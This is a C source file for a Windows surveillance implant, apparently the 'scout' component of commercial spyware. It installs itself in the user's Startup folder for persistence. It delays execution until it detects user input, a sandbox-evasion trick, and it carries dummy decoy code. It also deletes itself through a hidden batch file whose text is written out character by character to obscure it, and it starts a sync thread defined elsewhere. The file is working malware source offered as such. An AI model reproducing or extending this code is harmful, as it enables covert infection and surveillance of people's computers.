#include <Windows.h>
#include <stdio.h>
#include <Shlobj.h>
#include <Shlwapi.h>

#include "main.h"
#include "api.h"
#include "binpatched_vars.h"
#include "autodelete_batch.h"

#pragma comment(lib, "advapi32")
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "winhttp")
#pragma comment(lib, "netapi32")
#pragma comment(lib, "gdiplus")
#pragma comment(lib, "shell32")
#pragma comment(lib, "shlwapi")

extern VOID SyncThreadFunction();

int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR    lpCmdLine,
	int       nCmdShow)
{
#ifdef _DEBUG_BINPATCH
	MessageBox(NULL, L"_DEBUG_BINPATCH", L"_DEBUG_BINPATCH", 0);
#endif

	

	// FIXME: decidere quanto waitare
	// FIXME: bailout && malloc && free

	if (GetCurrentProcessId() == 4)
		MessageBox(NULL, L"I'm going to start the program", L"Warning", 0);

	UseLess();
	WaitForInput();
	Drop();
	
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SyncThreadFunction, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
}

VOID Drop()
{
	PWCHAR pStartupPath = (PWCHAR)malloc(32767 * sizeof(WCHAR));
	SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, TRUE); // TRUE == CREATE

	PWCHAR pCurrentPath = (PWCHAR)malloc(32767 * sizeof(WCHAR));
	GetModuleFileName(NULL, pCurrentPath, 32767);

	*(StrRChr(pCurrentPath, NULL, L'\\')) = 0;
	
	if (StrCmpI(pCurrentPath, pStartupPath))
	{
		GetModuleFileName(NULL, pCurrentPath, 32767);

		PWCHAR pFullName = (PWCHAR)malloc(32767 * sizeof(WCHAR));
		memset(pFullName, 0x0, 32767*sizeof(WCHAR));
		_swprintf(pFullName, L"%s\\%S.exe", pStartupPath, SCOUT_NAME);
		
		CopyFile(pCurrentPath, pFullName, FALSE);
	}
}

VOID UseLess()
{
	if (GetCurrentProcessId() == 4) 
	{
		MessageBox(NULL, L"Click to start the program", L"Starting", 0);

		memset(DEMO_TAG, 0x0, 3);
		memset(WMARKER, 0x0, 3);
		memset(CLIENT_KEY, 0x0, 3);
		memset(ENCRYPTION_KEY_CONF, 0x0, 3);
		memset(SCOUT_NAME, 0x0, 3);
	}
}



VOID WaitForInput()
{
	ULONG uLastInput;
	LASTINPUTINFO pLastInputInfo;

#ifdef _DEBUG
	OutputDebugString(L"[+] FIRST_WAIT\n");
#endif
	Sleep(FIRST_WAIT);

	pLastInputInfo.cbSize = sizeof(LASTINPUTINFO);
	GetLastInputInfo(&pLastInputInfo);
	uLastInput = pLastInputInfo.dwTime;
	while (1)
	{
		pLastInputInfo.cbSize = sizeof(LASTINPUTINFO);
		if (GetLastInputInfo(&pLastInputInfo))
		{
			if (pLastInputInfo.dwTime != uLastInput)
				break;
		}
		else
		{
#ifdef _DEBUG
			OutputDebugString(L"[+] GetLastInput FAILED\n");
#endif
			Sleep(FIRST_WAIT);
			break;
		}

#ifdef _DEBUG
		OutputDebugString(L"[+] Waiting for input...\n");
#endif
		Sleep(5000);
	}
}


VOID DeleteAndDie()
{
	HANDLE hFile;
	LPSTR pTempPath = (LPSTR)malloc(32767);
	LPSTR pBatFileName = (LPSTR)malloc(32767);
	char batch_format[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 's', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 's', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 's', '"', 0x0 };

	GetEnvironmentVariableA("TMP", pTempPath, 32767);
	ULONG uTick = GetTickCount();
	do
	{
		_snprintf_s(pBatFileName, 32766, _TRUNCATE, "%s\\%d.bat", pTempPath, uTick++);
		hFile = CreateFileA(pBatFileName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while(1);

#ifdef _DEBUG
	OutputDebugStringA(pBatFileName);
#endif

	LPSTR pExeFileName = (LPSTR)malloc(32767);
	GetModuleFileNameA(NULL, pExeFileName, 32767);

	ULONG uSize = strlen(batch_format) + 32676*3 + 1;
	LPSTR pBatchBuffer = (LPSTR)malloc(uSize);
	memset(pBatchBuffer, 0x0, uSize);
	_snprintf_s(pBatchBuffer, uSize, _TRUNCATE, batch_format, pExeFileName, pExeFileName, pBatFileName);

	ULONG uOut;
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);
	
	STARTUPINFOA pSinfo;
	PROCESS_INFORMATION pPinfo;
	memset(&pSinfo, 0x0, sizeof(STARTUPINFOA));
	memset(&pPinfo, 0x0, sizeof(PROCESS_INFORMATION));
	
	pSinfo.cb = sizeof(STARTUPINFO);
	pSinfo.dwFlags = STARTF_USESHOWWINDOW;
	pSinfo.wShowWindow = SW_HIDE;
	if (CreateProcessA(NULL, pBatFileName, NULL, NULL, FALSE, 0, NULL, NULL, &pSinfo, &pPinfo))
		ExitProcess(0);
#ifdef _DEBUG
	else
		OutputDebugString(L"[!!] Error executing autodelete batch!!\n");
#endif

	free(pTempPath);
	free(pBatFileName);
	free(pExeFileName);
	free(pBatchBuffer);
}




